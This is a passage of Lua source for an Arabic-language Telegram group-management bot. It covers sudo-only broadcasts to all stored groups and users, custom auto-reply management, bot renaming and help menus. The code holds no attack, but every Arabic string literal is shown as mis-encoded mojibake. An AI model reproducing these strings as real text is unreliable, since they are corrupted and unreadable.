sendVideo(v, 0, 0, 1, nil, msg.content_.video_.video_.persistent_id_,(msg.content_.caption_ or '')) 
end 
elseif msg.content_.voice_ then
for k,v in pairs(List) do 
mfmText = "ุงูุจุตูู"
sendVoice(v, 0, 0, 1, nil, msg.content_.voice_.voice_.persistent_id_,(msg.content_.caption_ or '')) 
end 
elseif msg.content_.audio_ then
for k,v in pairs(List) do 
mfmText = "ุงูุตูุช"
sendAudio(v, 0, 0, 1, nil, msg.content_.audio_.audio_.persistent_id_,(msg.content_.caption_ or '')) 
end 
elseif msg.content_.document_ then
for k,v in pairs(List) do 
mfmText = "ุงูููู"
sendDocument(v, 0, 0, 1,nil, msg.content_.document_.document_.persistent_id_,(msg.content_.caption_ or ''))    
end 
elseif msg.content_.sticker_ then
for k,v in pairs(List) do 
mfmText = "ุงูููุตู"
sendSticker(v, 0, 0, 1, nil, msg.content_.sticker_.sticker_.persistent_id_)   
end 
end
Dev_mfm(msg.chat_id_, msg.id_, 1, "โ๏ธุชู ุงุฐุงุนุฉ "..mfmText.." ุจูุฌุงุญ \nโ๏ธโูู โซ โจ "..#List.." โฉ ูุฌููุนู \n โ", 1, 'md')
Devmfm:del(mustafa.."mfm:Send:Gp" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
end
if text == "ุงุฐุงุนู ุจุงูุชูุฌูู" and msg.reply_to_message_id_ == 0 and SudoBot(msg) or text == "โซ ุงุฐุงุนู ุนุงู ุจุงูุชูุฌูู โ" and msg.reply_to_message_id_ == 0 and SudoBot(msg) then 
if Devmfm:get(mustafa.."mfm:Send:Bot"..mustafa) and not SecondSudo(msg) then 
send(msg.chat_id_, msg.id_,"โ๏ธุงูุงุฐุงุนู ูุนุทูู ูู ูุจู ุงููุทูุฑ ุงูุงุณุงุณู")
return false
end
Devmfm:setex(mustafa.."mfm:Send:FwdGp" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
local mustafaTEAM = 'โ๏ธุงููุง ุนุฒูุฒู โซ '..mfmRank(msg)..' \nโ๏ธุงุฑุณู ุงูุฑุณุงูู ุงูุงู ูุชูุฌููุง \nโ๏ธููุฎุฑูุฌ ุงุฑุณู โซ ( ุงูุบุงุก ) \n โ'
mfmmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, mustafaTEAM, 14, string.len(msg.sender_user_id_))
return false
end 
if Devmfm:get(mustafa.."mfm:Send:FwdGp" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
if text == 'ุงูุบุงุก' then   
Dev_mfm(msg.chat_id_, msg.id_, 1, "โ๏ธุชู ุงูุบุงุก ุงูุฑ ุงูุงุฐุงุนู ุจูุฌุงุญ", 1, 'md')
Devmfm:del(mustafa.."mfm:Send:FwdGp" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false  
end 
local List = Devmfm:smembers(mustafa..'mfm:Groups')   
for k,v in pairs(List) do  
tdcli_function({ID="ForwardMessages", chat_id_ = v, from_chat_id_ = msg.chat_id_, message_ids_ = {[0] = msg.id_}, disable_notification_ = 0, from_background_ = 1},function(a,t) end,nil) 
end   
Dev_mfm(msg.chat_id_, msg.id_, 1, "โ๏ธุชู ุงุฐุงุนุฉ ุฑุณุงูุชู ุจุงูุชูุฌูู \nโ๏ธโูู โซ โจ "..#List.." โฉ ูุฌููุนู \n โ", 1, 'md')
Devmfm:del(mustafa.."mfm:Send:FwdGp" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
end
if text == "ุงุฐุงุนู ุฎุงุต ุจุงูุชูุฌูู" and msg.reply_to_message_id_ == 0 and SudoBot(msg) or text == "โซ ุงุฐุงุนู ุฎุงุต ุจุงูุชูุฌูู โ" and msg.reply_to_message_id_ == 0 and SudoBot(msg) then 
if Devmfm:get(mustafa.."mfm:Send:Bot"..mustafa) and not SecondSudo(msg) then 
send(msg.chat_id_, msg.id_,"โ๏ธุงูุงุฐุงุนู ูุนุทูู ูู ูุจู ุงููุทูุฑ ุงูุงุณุงุณู")
return false
end
Devmfm:setex(mustafa.."mfm:Send:FwdPv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
local mustafaTEAM = 'โ๏ธุงููุง ุนุฒูุฒู โซ '..mfmRank(msg)..' \nโ๏ธุงุฑุณู ุงูุฑุณุงูู ุงูุงู ูุชูุฌููุง \nโ๏ธููุฎุฑูุฌ ุงุฑุณู โซ ( ุงูุบุงุก ) \n โ'
mfmmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, mustafaTEAM, 14, string.len(msg.sender_user_id_))
return false
end 
if Devmfm:get(mustafa.."mfm:Send:FwdPv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
if text == 'ุงูุบุงุก' then   
Dev_mfm(msg.chat_id_, msg.id_, 1, "โ๏ธุชู ุงูุบุงุก ุงูุฑ ุงูุงุฐุงุนู ุจูุฌุงุญ", 1, 'md')
Devmfm:del(mustafa.."mfm:Send:FwdPv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false  
end 
local List = Devmfm:smembers(mustafa..'mfm:Users')   
for k,v in pairs(List) do  
tdcli_function({ID="ForwardMessages", chat_id_ = v, from_chat_id_ = msg.chat_id_, message_ids_ = {[0] = msg.id_}, disable_notification_ = 0, from_background_ = 1},function(a,t) end,nil) 
end   
Dev_mfm(msg.chat_id_, msg.id_, 1, "โ๏ธุชู ุงุฐุงุนุฉ ุฑุณุงูุชู ุจุงูุชูุฌูู \nโ๏ธโุงูู โซ โจ "..#List.." โฉ ูุดุชุฑู \n โ", 1, 'md')
Devmfm:del(mustafa.."mfm:Send:FwdPv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
end
if text == "ุงุฐุงุนู ุจุงูุชุซุจูุช" and msg.reply_to_message_id_ == 0 and SudoBot(msg) or text == "โซ ุงุฐุงุนู ุจุงูุชุซุจูุช โ" and msg.reply_to_message_id_ == 0 and SudoBot(msg) then 
if Devmfm:get(mustafa.."mfm:Send:Bot"..mustafa) and not SecondSudo(msg) then 
send(msg.chat_id_, msg.id_,"โ๏ธุงูุงุฐุงุนู ูุนุทูู ูู ูุจู ุงููุทูุฑ ุงูุงุณุงุณู")
return false
end
Devmfm:setex(mustafa.."mfm:Send:Gp:Pin" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
local mustafaTEAM = 'โ๏ธุงููุง ุนุฒูุฒู โซ '..mfmRank(msg)..' \nโ๏ธุงุฑุณู ูู ุณูุงุก โซ โค \nโจ ููู โข ููุตู โข ูุชุญุฑูู โข ุตูุฑู\n โข ููุฏูู โข ุจุตูู โข ุตูุช โข ุฑุณุงูู โฉ\nโ๏ธููุฎุฑูุฌ ุงุฑุณู โซ ( ุงูุบุงุก ) \n โ'
mfmmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, mustafaTEAM, 14, string.len(msg.sender_user_id_))
return false
end 
if Devmfm:get(mustafa.."mfm:Send:Gp:Pin" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
if text == "ุงูุบุงุก" then   
Dev_mfm(msg.chat_id_, msg.id_, 1, "โ๏ธุชู ุงูุบุงุก ุงูุฑ ุงูุงุฐุงุนู ุจูุฌุงุญ", 1, 'md')
Devmfm:del(mustafa.."mfm:Send:Gp:Pin" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false
end 
local List = Devmfm:smembers(mustafa.."mfm:Groups") 
if msg.content_.text_ then
for k,v in pairs(List) do 
mfmText = "ุงูุฑุณุงูู"
send(v, 0,"["..msg.content_.text_.."]") 
Devmfm:set(mustafa..'mfm:PinnedMsgs'..v,msg.content_.text_) 
end
elseif msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo = msg.content_.photo_.sizes_[0].photo_.persistent_id_
elseif msg.content_.photo_.sizes_[1] then
photo = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
for k,v in pairs(List) do 
mfmText = "ุงูุตูุฑู"
sendPhoto(v, 0, 0, 1, nil, photo,(msg.content_.caption_ or ''))
Devmfm:set(mustafa..'mfm:PinnedMsgs'..v,photo) 
end 
elseif msg.content_.animation_ then
for k,v in pairs(List) do 
mfmText = "ุงููุชุญุฑูู"
sendDocument(v, 0, 0, 1,nil, msg.content_.animation_.animation_.persistent_id_,(msg.content_.caption_ or ''))    
Devmfm:set(mustafa..'mfm:PinnedMsgs'..v,msg.content_.animation_.animation_.persistent_id_)
end 
elseif msg.content_.video_ then
for k,v in pairs(List) do 
mfmText = "ุงูููุฏูู"
sendVideo(v, 0, 0, 1, nil, msg.content_.video_.video_.persistent_id_,(msg.content_.caption_ or '')) 
Devmfm:set(mustafa..'mfm:PinnedMsgs'..v,msg.content_.video_.video_.persistent_id_)
end 
elseif msg.content_.voice_ then
for k,v in pairs(List) do 
mfmText = "ุงูุจุตูู"
sendVoice(v, 0, 0, 1, nil, msg.content_.voice_.voice_.persistent_id_,(msg.content_.caption_ or '')) 
Devmfm:set(mustafa..'mfm:PinnedMsgs'..v,msg.content_.voice_.voice_.persistent_id_)
end 
elseif msg.content_.audio_ then
for k,v in pairs(List) do 
mfmText = "ุงูุตูุช"
sendAudio(v, 0, 0, 1, nil, msg.content_.audio_.audio_.persistent_id_,(msg.content_.caption_ or '')) 
Devmfm:set(mustafa..'mfm:PinnedMsgs'..v,msg.content_.audio_.audio_.persistent_id_)
end 
elseif msg.content_.document_ then
for k,v in pairs(List) do 
mfmText = "ุงูููู"
sendDocument(v, 0, 0, 1,nil, msg.content_.document_.document_.persistent_id_,(msg.content_.caption_ or ''))    
Devmfm:set(mustafa..'mfm:PinnedMsgs'..v,msg.content_.document_.document_.persistent_id_)
end 
elseif msg.content_.sticker_ then
for k,v in pairs(List) do 
mfmText = "ุงูููุตู"
sendSticker(v, 0, 0, 1, nil, msg.content_.sticker_.sticker_.persistent_id_)   
Devmfm:set(mustafa..'mfm:PinnedMsgs'..v,msg.content_.sticker_.sticker_.persistent_id_) 
end 
end
Dev_mfm(msg.chat_id_, msg.id_, 1, "โ๏ธุชู ุงุฐุงุนุฉ "..mfmText.." ุจุงูุชุซุจูุช \nโ๏ธโูู โซ โจ "..#List.." โฉ ูุฌููุนู \n โ", 1, 'md')
Devmfm:del(mustafa.."mfm:Send:Gp:Pin" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false
end
if text == 'ุญุฐู ุฑุฏ' and Manager(msg) and ChCheck(msg) or text == 'ูุณุญ ุฑุฏ' and  Manager(msg) and ChCheck(msg) then
Devmfm:set(mustafa..'mfm:Add:GpRed'..msg.sender_user_id_..''..msg.chat_id_,'DelGpRed')
Dev_mfm(msg.chat_id_, msg.id_, 1, "โ๏ธุญุณูุง ุงุฑุณู ุงููููู ูุญุฐููุง " ,  1, "md")
return false
end
if text == 'ุงุถู ุฑุฏ' and Manager(msg) and ChCheck(msg) then
Devmfm:set(mustafa..'mfm:Add:GpRed'..msg.sender_user_id_..''..msg.chat_id_,'SetGpRed')
Dev_mfm(msg.chat_id_, msg.id_, 1, "โ๏ธุญุณูุง ุงุฑุณู ุงููููู ุงูุงู " ,  1, "md")
return false
end
if text and text:match("^(.*)$") then
local SetGpRed = Devmfm:get(mustafa..'mfm:Add:GpRed'..msg.sender_user_id_..''..msg.chat_id_..'')
if SetGpRed == 'SetGpRed' then
Dev_mfm(msg.chat_id_, msg.id_, 1, "โ๏ธุงุฑุณู ูู ุงูุฑุฏ ุณูุงุก ูุงู โซ โค\nโจ ููู โข ููุตู โข ูุชุญุฑูู โข ุตูุฑู\n โข ููุฏูู โข ุจุตูู โข ุตูุช โข ุฑุณุงูู โฉ\nโ๏ธููููู ุงุถุงูุฉ ุงูู ุงููุต โซ โค\nโ โ โ โ โ โ โ โ โ\n `#username` โฌ ูุนุฑู ุงููุณุชุฎุฏู\n `#msgs` โฌ ุนุฏุฏ ุงูุฑุณุงุฆู\n `#name` โฌ ุงุณู ุงููุณุชุฎุฏู\n `#id` โฌ ุงูุฏู ุงููุณุชุฎุฏู\n `#stast` โฌ ุฑุชุจุฉ ุงููุณุชุฎุฏู\n `#edit` โฌ ุนุฏุฏ ุงูุณุญูุงุช\nโ โ โ โ โ โ โ โ โ\nโ๏ธููุฎุฑูุฌ ุงุฑุณู โซ ( ุงูุบุงุก )\n โ" ,  1, "md")
Devmfm:set(mustafa..'mfm:Add:GpRed'..msg.sender_user_id_..''..msg.chat_id_..'','SaveGpRed')
Devmfm:set(mustafa..'mfm:Add:GpText'..msg.sender_user_id_..''..msg.chat_id_..'',text)
Devmfm:sadd(mustafa..'mfm:Manager:GpRed'..msg.chat_id_..'',text)
Devmfm:set(mustafa..'DelManagerRep'..msg.chat_id_..'',text)
return false
end
end
if text == 'ุญุฐู ุฑุฏ ุนุงู' and SecondSudo(msg) or text == 'โซ ุญุฐู ุฑุฏ ุนุงู โ' and SecondSudo(msg) or text == 'ูุณุญ ุฑุฏ ุนุงู' and SecondSudo(msg) then
Devmfm:set(mustafa.."mfm:Add:AllRed"..msg.sender_user_id_,'DelAllRed')
Dev_mfm(msg.chat_id_, msg.id_, 1, "โ๏ธุญุณูุง ุงุฑุณู ุงููููู ูุญุฐููุง " ,  1, "md")
return false
end
if text == 'ุงุถู ุฑุฏ ุนุงู' and SecondSudo(msg) or text == 'โซ ุงุถู ุฑุฏ ุนุงู โ' and SecondSudo(msg) then
Devmfm:set(mustafa.."mfm:Add:AllRed"..msg.sender_user_id_,'SetAllRed')
Dev_mfm(msg.chat_id_, msg.id_, 1, "โ๏ธุญุณูุง ุงุฑุณู ุงููููู ุงูุงู " ,  1, "md")
return false
end
if text and text:match("^(.*)$") then
local SetAllRed = Devmfm:get(mustafa.."mfm:Add:AllRed"..msg.sender_user_id_)
if SetAllRed == 'SetAllRed' then
Dev_mfm(msg.chat_id_, msg.id_, 1, "โ๏ธุงุฑุณู ูู ุงูุฑุฏ ุณูุงุก ูุงู โซ โค\nโจ ููู โข ููุตู โข ูุชุญุฑูู โข ุตูุฑู\n โข ููุฏูู โข ุจุตูู โข ุตูุช โข ุฑุณุงูู โฉ\nโ๏ธููููู ุงุถุงูุฉ ุงูู ุงููุต โซ โค\nโ โ โ โ โ โ โ โ โ\n `#username` โฌ ูุนุฑู ุงููุณุชุฎุฏู\n `#msgs` โฌ ุนุฏุฏ ุงูุฑุณุงุฆู\n `#name` โฌ ุงุณู ุงููุณุชุฎุฏู\n `#id` โฌ ุงูุฏู ุงููุณุชุฎุฏู\n `#stast` โฌ ุฑุชุจุฉ ุงููุณุชุฎุฏู\n `#edit` โฌ ุนุฏุฏ ุงูุณุญูุงุช\nโ โ โ โ โ โ โ โ โ\nโ๏ธููุฎุฑูุฌ ุงุฑุณู โซ ( ุงูุบุงุก )\n โ" ,  1, "md")
Devmfm:set(mustafa.."mfm:Add:AllRed"..msg.sender_user_id_,'SaveAllRed')
Devmfm:set(mustafa.."mfm:Add:AllText"..msg.sender_user_id_, text)
Devmfm:sadd(mustafa.."mfm:Sudo:AllRed",text)
Devmfm:set(mustafa.."DelSudoRep",text)
return false 
end end
if text == 'ุงูุฑุฏูุฏ' and Manager(msg) and ChCheck(msg) or text == 'ุฑุฏูุฏ ุงููุฏูุฑ' and Manager(msg) and ChCheck(msg) then
local redod = Devmfm:smembers(mustafa..'mfm:Manager:GpRed'..msg.chat_id_..'')
MsgRep = 'โ๏ธุฑุฏูุฏ ุงููุฏูุฑ โซ โค \nโ โ โ โ โ โ โ โ โ\n'
for k,v in pairs(redod) do
if Devmfm:get(mustafa.."mfm:Gif:GpRed"..v..msg.chat_id_) then
dp = 'ูุชุญุฑูู ๐ญ'
elseif Devmfm:get(mustafa.."mfm:Voice:GpRed"..v..msg.chat_id_) then
dp = 'ุจุตูู ๐'
elseif Devmfm:get(mustafa.."mfm:Stecker:GpRed"..v..msg.chat_id_) then
dp = 'ููุตู ๐'
elseif Devmfm:get(mustafa.."mfm:Text:GpRed"..v..msg.chat_id_) then
dp = 'ุฑุณุงูู โ'
elseif Devmfm:get(mustafa.."mfm:Photo:GpRed"..v..msg.chat_id_) then
dp = 'ุตูุฑู ๐'
elseif Devmfm:get(mustafa.."mfm:Video:GpRed"..v..msg.chat_id_) then
dp = 'ููุฏูู ๐ฝ'
elseif Devmfm:get(mustafa.."mfm:File:GpRed"..v..msg.chat_id_) then
dp = 'ููู ๐'
elseif Devmfm:get(mustafa.."mfm:Audio:GpRed"..v..msg.chat_id_) then
dp = 'ุงุบููู ๐ถ'
end
MsgRep = MsgRep..''..k..'~ (`'..v..'`) โซ {*'..dp..'*}\n' 
end
if #redod == 0 then
MsgRep = 'โ๏ธูุง ุชูุฌุฏ ุฑุฏูุฏ ูุถุงูู'
end
send(msg.chat_id_,msg.id_,MsgRep)
end
if text == 'ุญุฐู ุงูุฑุฏูุฏ' and Manager(msg) and ChCheck(msg) or text == 'ูุณุญ ุงูุฑุฏูุฏ' and Manager(msg) and ChCheck(msg) or text == 'ุญุฐู ุฑุฏูุฏ ุงููุฏูุฑ' and Manager(msg) and ChCheck(msg) or text == 'ูุณุญ ุฑุฏูุฏ ุงููุฏูุฑ' and Manager(msg) and ChCheck(msg) then
local redod = Devmfm:smembers(mustafa..'mfm:Manager:GpRed'..msg.chat_id_..'')
if #redod == 0 then
Dev_mfm(msg.chat_id_, msg.id_, 1, "โ๏ธูุง ุชูุฌุฏ ุฑุฏูุฏ ูุถุงูู" ,  1, "md")
else
for k,v in pairs(redod) do
Devmfm:del(mustafa..'mfm:Gif:GpRed'..v..msg.chat_id_)
Devmfm:del(mustafa..'mfm:Voice:GpRed'..v..msg.chat_id_)
Devmfm:del(mustafa..'mfm:Audio:GpRed'..v..msg.chat_id_)
Devmfm:del(mustafa..'mfm:Photo:GpRed'..v..msg.chat_id_)
Devmfm:del(mustafa..'mfm:Stecker:GpRed'..v..msg.chat_id_)
Devmfm:del(mustafa..'mfm:Video:GpRed'..v..msg.chat_id_)
Devmfm:del(mustafa..'mfm:File:GpRed'..v..msg.chat_id_)
Devmfm:del(mustafa..'mfm:Text:GpRed'..v..msg.chat_id_)
Devmfm:del(mustafa..'mfm:Manager:GpRed'..msg.chat_id_)
end
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธุชู ุญุฐู ุฑุฏูุฏ ุงููุฏูุฑ")  
return false
end
end
if  text == "ุฑุฏูุฏ ุงููุทูุฑ" and SecondSudo(msg) or text == "ุงูุฑุฏูุฏ ุงูุนุงู" and SecondSudo(msg) or text == "ุฑุฏูุฏ ุงูุนุงู" and SecondSudo(msg) or text == "โซ ุงูุฑุฏูุฏ ุงูุนุงู โ" and SecondSudo(msg) then
local redod = Devmfm:smembers(mustafa.."mfm:Sudo:AllRed")
MsgRep = 'โ๏ธุฑุฏูุฏ ุงููุทูุฑ โซ โค \nโ โ โ โ โ โ โ โ โ\n'
for k,v in pairs(redod) do
if Devmfm:get(mustafa.."mfm:Gif:AllRed"..v) then
dp = 'ูุชุญุฑูู ๐ญ'
elseif Devmfm:get(mustafa.."mfm:Voice:AllRed"..v) then
dp = 'ุจุตูู ๐'
elseif Devmfm:get(mustafa.."mfm:Stecker:AllRed"..v) then
dp = 'ููุตู ๐'
elseif Devmfm:get(mustafa.."mfm:Text:AllRed"..v) then
dp = 'ุฑุณุงูู โ'
elseif Devmfm:get(mustafa.."mfm:Photo:AllRed"..v) then
dp = 'ุตูุฑู ๐'
elseif Devmfm:get(mustafa.."mfm:Video:AllRed"..v) then
dp = 'ููุฏูู ๐ฝ'
elseif Devmfm:get(mustafa.."mfm:File:AllRed"..v) then
dp = 'ููู ๐'
elseif Devmfm:get(mustafa.."mfm:Audio:AllRed"..v) then
dp = 'ุงุบููู ๐ถ'
end
MsgRep = MsgRep..''..k..'~ (`'..v..'`) โซ {*'..dp..'*}\n' 
end
if #redod == 0 then
MsgRep = 'โ๏ธูุง ุชูุฌุฏ ุฑุฏูุฏ ูุถุงูู'
end
send(msg.chat_id_,msg.id_,MsgRep)
end
if text == "ุญุฐู ุฑุฏูุฏ ุงููุทูุฑ" and SecondSudo(msg) or text == "ุญุฐู ุฑุฏูุฏ ุงูุนุงู" and SecondSudo(msg) or text == "ูุณุญ ุฑุฏูุฏ ุงููุทูุฑ" and SecondSudo(msg) then
local redod = Devmfm:smembers(mustafa.."mfm:Sudo:AllRed")
if #redod == 0 then
Dev_mfm(msg.chat_id_, msg.id_, 1, "โ๏ธูุง ุชูุฌุฏ ุฑุฏูุฏ ูุถุงูู" ,  1, "md")
else
for k,v in pairs(redod) do
Devmfm:del(mustafa.."mfm:Add:AllRed"..v)
Devmfm:del(mustafa.."mfm:Gif:AllRed"..v)
Devmfm:del(mustafa.."mfm:Voice:AllRed"..v)
Devmfm:del(mustafa.."mfm:Audio:AllRed"..v)
Devmfm:del(mustafa.."mfm:Photo:AllRed"..v)
Devmfm:del(mustafa.."mfm:Stecker:AllRed"..v)
Devmfm:del(mustafa.."mfm:Video:AllRed"..v)
Devmfm:del(mustafa.."mfm:File:AllRed"..v)
Devmfm:del(mustafa.."mfm:Text:AllRed"..v)
Devmfm:del(mustafa.."mfm:Sudo:AllRed")
end
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธุชู ุญุฐู ุฑุฏูุฏ ุงููุทูุฑ")  
return false
end
end 
if text and text == "ุชุบููุฑ ุงุณู ุงูุจูุช" or text and text == "ูุถุน ุงุณู ุงูุจูุช" or text and text == "ุชุบูุฑ ุงุณู ุงูุจูุช" then
if not SecondSudo(msg) then
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธูููุทูุฑ ุงูุงุณุงุณู ููุท ', 1, 'md')
else
Dev_mfm(msg.chat_id_, msg.id_, 1, "โ๏ธุงุฑุณู ูู ุงุณู ุงูุจูุช ุงูุงู" ,  1, "md") 
Devmfm:set(mustafa..'mfm:NameBot'..msg.sender_user_id_..'', 'msg')
return false 
end
end
if text and text == 'ุญุฐู ุงุณู ุงูุจูุช' or text == 'ูุณุญ ุงุณู ุงูุจูุช' then
if not SecondSudo(msg) then
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธูููุทูุฑ ุงูุงุณุงุณู ููุท ', 1, 'md')
else
Devmfm:del(mustafa..'mfm:NameBot')
local mustafaTEAM = 'โ๏ธุงููุง ุนุฒูุฒู โซ '..mfmRank(msg)..' \nโ๏ธุชู ุญุฐู ุงุณู ุงูุจูุช'
mfmmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, mustafaTEAM, 14, string.len(msg.sender_user_id_))
end end 
if text and text:match("^ุงุณุชุนุงุฏู ุงูุงูุงูุฑ$") and SecondSudo(msg) or text and text:match("^ุงุณุชุนุงุฏุฉ ููุงูุด ุงูุงูุงูุฑ$") and SecondSudo(msg) then
HelpList ={'mfm:Help','mfm:Help1','mfm:Help2','mfm:Help3','mfm:Help4','mfm:Help5','mfm:Help6'}
for i,Help in pairs(HelpList) do
Devmfm:del(mustafa..Help) 
end
Dev_mfm(msg.chat_id_, msg.id_, 1, "โ๏ธุชู ุงุณุชุนุงุฏุฉ ุงูููุงูุด ุงูุงุตููู" ,  1, "md") 
end
if text == "ุชุนููู ุงูุงูุงูุฑ" and SecondSudo(msg) or text == "ุชุนููู ุงูุฑ ุงูุงูุงูุฑ" and SecondSudo(msg) then
Dev_mfm(msg.chat_id_, msg.id_, 1, "โ๏ธุงุฑุณู ูููุดุฉ (ุงูุงูุงูุฑ) ุงูุงู " ,  1, "md")
Devmfm:set(mustafa..'mfm:Help0'..msg.sender_user_id_, 'msg')
return false end
if text and text:match("^(.*)$") then
local mustafaTEAM =  Devmfm:get(mustafa..'mfm:Help0'..msg.sender_user_id_)
if mustafaTEAM == 'msg' then
Dev_mfm(msg.chat_id_, msg.id_, 1, "โ๏ธุชู ุญูุธ ุงููููุดู ุงูุฌุฏูุฏู " ,  1, "md")
Devmfm:del(mustafa..'mfm:Help0'..msg.sender_user_id_)
Devmfm:set(mustafa..'mfm:Help', text)
Dev_mfm(msg.chat_id_, msg.id_, 1, text , 1, 'md')
return false end
end
if text == "ุงูุงูุงูุฑ" or text == "ุงูุงูุฑ" or text == "ูุณุงุนุฏู" then
if not Admin(msg) then
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธูุฐุง ุงูุงูุฑ ูุฎุต ุงูุฑุชุจ ุงูุงุนูู ููุท\nโ๏ธุงุฑุณู โซ (ู6) ูุนุฑุถ ุงูุงูุฑ ุงูุงุนุถุงุก', 1, 'md')
else
local Help = Devmfm:get(mustafa..'mfm:Help')
local text =  [[
โ๏ธุงููุง ุจู ูู ูุงุฆูุฉ ุงูุงูุงูุฑ โซ โค 
โ โ โ โ โ โ โ โ โ
โ๏ธู1 โซ ุงูุงูุฑ ุงูุญูุงูู
โ๏ธู2 โซ ุงูุงูุฑ ุงูุงุฏูููู
โ๏ธู3 โซ ุงูุงูุฑ ุงููุฏุฑุงุก
โ๏ธู4 โซ ุงูุงูุฑ ุงูููุดุฆูู
โ๏ธู5 โซ ุงูุงูุฑ ุงููุทูุฑูู
โ๏ธู6 โซ ุงูุงูุฑ ุงูุงุนุถุงุก
โ โ โ โ โ โ โ โ โ
โ๏ธ[๐๐๐๐๐๐ ๐๐๐๐๐](https://t.me/KKDKKB7)
]] 
Dev_mfm(msg.chat_id_, msg.id_, 1, (Help or text), 1, 'md')
end
end
if text == "ุชุนููู ุงูุฑ ู1" and SecondSudo(msg) or text == "ุชุนููู ุงูุฑ ููก" and SecondSudo(msg) then
Dev_mfm(msg.chat_id_, msg.id_, 1, "โ๏ธุงุฑุณู ูููุดุฉ (ู1) ุงูุงู " ,  1, "md")
Devmfm:set(mustafa..'mfm:Help01'..msg.sender_user_id_, 'msg')
return false end
if text and text:match("^(.*)$") then
local mustafaTEAM =  Devmfm:get(mustafa..'mfm:Help01'..msg.sender_user_id_)
if mustafaTEAM == 'msg' then 
Dev_mfm(msg.chat_id_, msg.id_, 1, "โ๏ธุชู ุญูุธ ุงููููุดู ุงูุฌุฏูุฏู " ,  1, "md")
Devmfm:del(mustafa..'mfm:Help01'..msg.sender_user_id_)
Devmfm:set(mustafa..'mfm:Help1', text)
Dev_mfm(msg.chat_id_, msg.id_, 1, text , 1, 'md')
return false end
end
if text == "ู1" or text == "ููก" or text == "ุงูุงูุฑ1" or text == "ุงูุงูุฑูก" then
if not Admin(msg) then
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธูุฐุง ุงูุงูุฑ ูุฎุต ุงูุฑุชุจ ุงูุงุนูู ููุท\nโ๏ธุงุฑุณู โซ (ู6) ูุนุฑุถ ุงูุงูุฑ ุงูุงุนุถุงุก', 1, 'md')
else
local Help = Devmfm:get(mustafa..'mfm:Help1')
local text =  [[
โ๏ธุงูุงูุฑ ุญูุงูุฉ ุงููุฌููุนู โซ โค
โ โ โ โ โ โ โ โ โ
โ๏ธููู โข ูุชุญ โซ ุงูุฑูุงุจุท
โ๏ธููู โข ูุชุญ โซ ุงููุนุฑูุงุช
โ๏ธููู โข ูุชุญ โซ ุงูุจูุชุงุช
โ๏ธููู โข ูุชุญ โซ ุงููุชุญุฑูู
โ๏ธููู โข ูุชุญ โซ ุงูููุตูุงุช
โ๏ธููู โข ูุชุญ โซ ุงููููุงุช
โ๏ธููู โข ูุชุญ โซ ุงูุตูุฑ
โ๏ธููู โข ูุชุญ โซ ุงูููุฏูู
โ๏ธููู โข ูุชุญ โซ ุงูุงูููุงูู
โ๏ธููู โข ูุชุญ โซ ุงูุฏุฑุฏุดู
โ๏ธููู โข ูุชุญ โซ ุงูุชูุฌูู
โ๏ธููู โข ูุชุญ โซ ุงูุงุบุงูู
โ๏ธููู โข ูุชุญ โซ ุงูุตูุช
โ๏ธููู โข ูุชุญ โซ ุงูุฌูุงุช
โ๏ธููู โข ูุชุญ โซ ุงููุงุฑูุฏุงูู
โ๏ธููู โข ูุชุญ โซ ุงูุชูุฑุงุฑ
โ๏ธููู โข ูุชุญ โซ ุงููุงุดุชุงู
โ๏ธููู โข ูุชุญ โซ ุงูุชุนุฏูู
โ๏ธููู โข ูุชุญ โซ ุงูุชุซุจูุช
โ๏ธููู โข ูุชุญ โซ ุงูุงุดุนุงุฑุงุช
โ๏ธููู โข ูุชุญ โซ ุงูููุงูุด
โ๏ธููู โข ูุชุญ โซ ุงูุฏุฎูู
โ๏ธููู โข ูุชุญ โซ ุงูุดุจูุงุช
โ๏ธููู โข ูุชุญ โซ ุงูููุงูุน
โ๏ธููู โข ูุชุญ โซ ุงููุดุงุฑ
โ๏ธููู โข ูุชุญ โซ ุงูููุฑ
โ๏ธููู โข ูุชุญ โซ ุงูุทุงุฆููู
โ๏ธููู โข ูุชุญ โซ ุงููู
โ๏ธููู โข ูุชุญ โซ ุงูุนุฑุจูู
โ๏ธููู โข ูุชุญ โซ ุงูุงููููุฒูู
โ๏ธููู โข ูุชุญ โซ ุงููุงุฑุณูู
โ๏ธููู โข ูุชุญ โซ ุงูุชูููุด
โ โ โ โ โ โ โ โ โ
โ๏ธุงูุงูุฑ ุญูุงูู ุงุฎุฑู โซ โค
โ โ โ โ โ โ โ โ โ
โ๏ธููู โข ูุชุญ + ุงูุงูุฑ โซ โค
โ๏ธุงูุชูุฑุงุฑ ุจุงูุทุฑุฏ
โ๏ธุงูุชูุฑุงุฑ ุจุงููุชู
โ๏ธุงูุชูุฑุงุฑ ุจุงูุชููุฏ
โ๏ธุงููุงุฑุณูู ุจุงูุทุฑุฏ
โ๏ธุงูุจูุชุงุช ุจุงูุทุฑุฏ
โ๏ธุงูุจูุชุงุช ุจุงูุชููุฏ
โ โ โ โ โ โ โ โ โ
โ๏ธ[๐๐๐๐๐๐ ๐๐๐๐๐](https://t.me/KKDKKB7)
]]
